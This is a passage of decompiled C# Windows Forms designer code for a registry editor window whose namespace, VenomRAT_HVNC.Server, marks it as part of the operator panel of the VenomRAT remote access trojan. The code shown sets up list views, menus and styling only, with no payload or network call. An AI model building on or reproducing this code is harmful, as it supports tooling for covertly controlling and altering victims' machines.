			this.tvRegistryDirectory.KeyUp += new global::System.Windows.Forms.KeyEventHandler(this.tvRegistryDirectory_KeyUp);
			this.lstRegistryValues.BackColor = global::System.Drawing.Color.FromArgb(30, 30, 30);
			this.lstRegistryValues.Columns.AddRange(new global::System.Windows.Forms.ColumnHeader[] { this.hName, this.hType, this.hValue });
			this.lstRegistryValues.ForeColor = global::System.Drawing.Color.Gainsboro;
			this.lstRegistryValues.FullRowSelect = true;
			this.lstRegistryValues.HeaderStyle = global::System.Windows.Forms.ColumnHeaderStyle.Nonclickable;
			this.lstRegistryValues.HideSelection = false;
			this.lstRegistryValues.Location = new global::System.Drawing.Point(290, 61);
			this.lstRegistryValues.Name = "lstRegistryValues";
			this.lstRegistryValues.Size = new global::System.Drawing.Size(493, 600);
			this.lstRegistryValues.SmallImageList = this.imageRegistryKeyTypeList;
			this.lstRegistryValues.TabIndex = 0;
			this.lstRegistryValues.UseCompatibleStateImageBehavior = false;
			this.lstRegistryValues.View = global::System.Windows.Forms.View.Details;
			this.lstRegistryValues.AfterLabelEdit += new global::System.Windows.Forms.LabelEditEventHandler(this.lstRegistryKeys_AfterLabelEdit);
			this.lstRegistryValues.KeyUp += new global::System.Windows.Forms.KeyEventHandler(this.lstRegistryKeys_KeyUp);
			this.lstRegistryValues.MouseUp += new global::System.Windows.Forms.MouseEventHandler(this.lstRegistryKeys_MouseClick);
			this.hName.Text = "Name";
			this.hName.Width = 173;
			this.hType.Text = "Type";
			this.hType.Width = 104;
			this.hValue.Text = "Value";
			this.hValue.Width = 214;
			this.guna2BorderlessForm1.AnimateWindow = true;
			this.guna2BorderlessForm1.ContainerControl = this;
			this.guna2BorderlessForm1.DockIndicatorColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.guna2BorderlessForm1.ShadowColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			base.AutoScaleDimensions = new global::System.Drawing.SizeF(96f, 96f);
			base.AutoScaleMode = global::System.Windows.Forms.AutoScaleMode.Dpi;
			this.BackColor = global::System.Drawing.Color.FromArgb(30, 30, 30);
			base.ClientSize = new global::System.Drawing.Size(783, 663);
			base.Controls.Add(this.guna2Panel1);
			base.Controls.Add(this.menuStrip);
			base.Controls.Add(this.tvRegistryDirectory);
			base.Controls.Add(this.lstRegistryValues);
			base.Controls.Add(this.tableLayoutPanel);
			this.Font = new global::System.Drawing.Font("Segoe UI", 8.25f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.ForeColor = global::System.Drawing.Color.Black;
			base.FormBorderStyle = global::System.Windows.Forms.FormBorderStyle.None;
			base.MainMenuStrip = this.menuStrip;
			base.Name = "FormRegistryEditor";
			base.StartPosition = global::System.Windows.Forms.FormStartPosition.CenterScreen;
			this.Text = "Registry Editor []";
			base.FormClosed += new global::System.Windows.Forms.FormClosedEventHandler(this.FormRegistryEditor_FormClosed);
			base.Load += new global::System.EventHandler(this.FrmRegistryEditor_Load);
			this.tableLayoutPanel.ResumeLayout(false);
			this.tableLayoutPanel.PerformLayout();
			this.statusStrip.ResumeLayout(false);
			this.statusStrip.PerformLayout();
			this.menuStrip.ResumeLayout(false);
			this.menuStrip.PerformLayout();
			this.tv_ContextMenuStrip.ResumeLayout(false);
			this.selectedItem_ContextMenuStrip.ResumeLayout(false);
			this.lst_ContextMenuStrip.ResumeLayout(false);
			this.guna2Panel1.ResumeLayout(false);
			this.guna2Panel1.PerformLayout();
			base.ResumeLayout(false);
			base.PerformLayout();
		}

		private global::System.ComponentModel.IContainer components;

		private global::System.Windows.Forms.TableLayoutPanel tableLayoutPanel;

		public global::VenomRAT_HVNC.Server.Helper.RegistryTreeView tvRegistryDirectory;

		private global::VenomRAT_HVNC.Server.Helper.AeroListView lstRegistryValues;

		private global::System.Windows.Forms.ImageList imageRegistryDirectoryList;

		private global::System.Windows.Forms.ColumnHeader hName;

		private global::System.Windows.Forms.ColumnHeader hType;

		private global::System.Windows.Forms.ColumnHeader hValue;

		private global::System.Windows.Forms.ImageList imageRegistryKeyTypeList;

		private global::System.Windows.Forms.ContextMenuStrip tv_ContextMenuStrip;

		private global::System.Windows.Forms.ToolStripMenuItem newToolStripMenuItem;

		private global::System.Windows.Forms.ToolStripMenuItem keyToolStripMenuItem;

		private global::System.Windows.Forms.ToolStripSeparator toolStripSeparator1;

		private global::System.Windows.Forms.ToolStripMenuItem deleteToolStripMenuItem;

		private global::System.Windows.Forms.ToolStripMenuItem renameToolStripMenuItem;

		private global::System.Windows.Forms.ToolStripSeparator toolStripSeparator2;

		private global::System.Windows.Forms.ToolStripMenuItem stringValueToolStripMenuItem;

		private global::System.Windows.Forms.ToolStripMenuItem binaryValueToolStripMenuItem;

		private global::System.Windows.Forms.ToolStripMenuItem dWORD32bitValueToolStripMenuItem;

		private global::System.Windows.Forms.ToolStripMenuItem qWORD64bitValueToolStripMenuItem;

		private global::System.Windows.Forms.ToolStripMenuItem multiStringValueToolStripMenuItem;

		private global::System.Windows.Forms.ToolStripMenuItem expandableStringValueToolStripMenuItem;

		private global::System.Windows.Forms.ContextMenuStrip selectedItem_ContextMenuStrip;

		private global::System.Windows.Forms.ToolStripMenuItem modifyToolStripMenuItem;

		private global::System.Windows.Forms.ToolStripMenuItem modifyBinaryDataToolStripMenuItem;

		private global::System.Windows.Forms.ToolStripMenuItem deleteToolStripMenuItem1;

		private global::System.Windows.Forms.ToolStripMenuItem renameToolStripMenuItem1;

		private global::System.Windows.Forms.ContextMenuStrip lst_ContextMenuStrip;

		private global::System.Windows.Forms.ToolStripMenuItem newToolStripMenuItem1;

		private global::System.Windows.Forms.ToolStripMenuItem keyToolStripMenuItem1;

		private global::System.Windows.Forms.ToolStripMenuItem stringValueToolStripMenuItem1;

		private global::System.Windows.Forms.ToolStripMenuItem binaryValueToolStripMenuItem1;

		private global::System.Windows.Forms.ToolStripMenuItem dWORD32bitValueToolStripMenuItem1;

		private global::System.Windows.Forms.ToolStripMenuItem qWORD64bitValueToolStripMenuItem1;

		private global::System.Windows.Forms.ToolStripMenuItem multiStringValueToolStripMenuItem1;

		private global::System.Windows.Forms.ToolStripMenuItem expandableStringValueToolStripMenuItem1;

		private global::System.Windows.Forms.ToolStripSeparator toolStripSeparator4;

		private global::System.Windows.Forms.MenuStrip menuStrip;

		private global::System.Windows.Forms.ToolStripMenuItem fileToolStripMenuItem;

		private global::System.Windows.Forms.ToolStripMenuItem exitToolStripMenuItem;

		private global::System.Windows.Forms.ToolStripMenuItem editToolStripMenuItem;

		private global::System.Windows.Forms.ToolStripMenuItem modifyToolStripMenuItem1;

		private global::System.Windows.Forms.ToolStripMenuItem modifyBinaryDataToolStripMenuItem1;

		private global::System.Windows.Forms.ToolStripSeparator modifyNewtoolStripSeparator;

		private global::System.Windows.Forms.ToolStripMenuItem newToolStripMenuItem2;

		private global::System.Windows.Forms.ToolStripSeparator toolStripSeparator6;

		private global::System.Windows.Forms.ToolStripMenuItem deleteToolStripMenuItem2;

		private global::System.Windows.Forms.ToolStripMenuItem renameToolStripMenuItem2;

		private global::System.Windows.Forms.ToolStripMenuItem keyToolStripMenuItem2;

		private global::System.Windows.Forms.ToolStripSeparator toolStripSeparator7;

		private global::System.Windows.Forms.ToolStripMenuItem stringValueToolStripMenuItem2;

		private global::System.Windows.Forms.ToolStripMenuItem binaryValueToolStripMenuItem2;

		private global::System.Windows.Forms.ToolStripMenuItem dWORD32bitValueToolStripMenuItem2;

		private global::System.Windows.Forms.ToolStripMenuItem qWORD64bitValueToolStripMenuItem2;

		private global::System.Windows.Forms.ToolStripMenuItem multiStringValueToolStripMenuItem2;

		private global::System.Windows.Forms.ToolStripMenuItem expandableStringValueToolStripMenuItem2;

		private global::System.Windows.Forms.ToolStripSeparator modifyToolStripSeparator1;

		public global::System.Windows.Forms.Timer timer1;

		private global::System.Windows.Forms.StatusStrip statusStrip;

		private global::System.Windows.Forms.ToolStripStatusLabel selectedStripStatusLabel;

		private global::Guna.UI2.WinForms.Guna2DragControl guna2DragControl1;

		private global::Guna.UI2.WinForms.Guna2Panel guna2Panel1;

		private global::Guna.UI2.WinForms.Guna2ControlBox guna2ControlBox1;

		private global::Guna.UI2.WinForms.Guna2Separator guna2Separator2;

		private global::Guna.UI2.WinForms.Guna2Separator guna2Separator1;

		private global::System.Windows.Forms.Label label1;

		private global::Guna.UI2.WinForms.Guna2BorderlessForm guna2BorderlessForm1;
	}
}
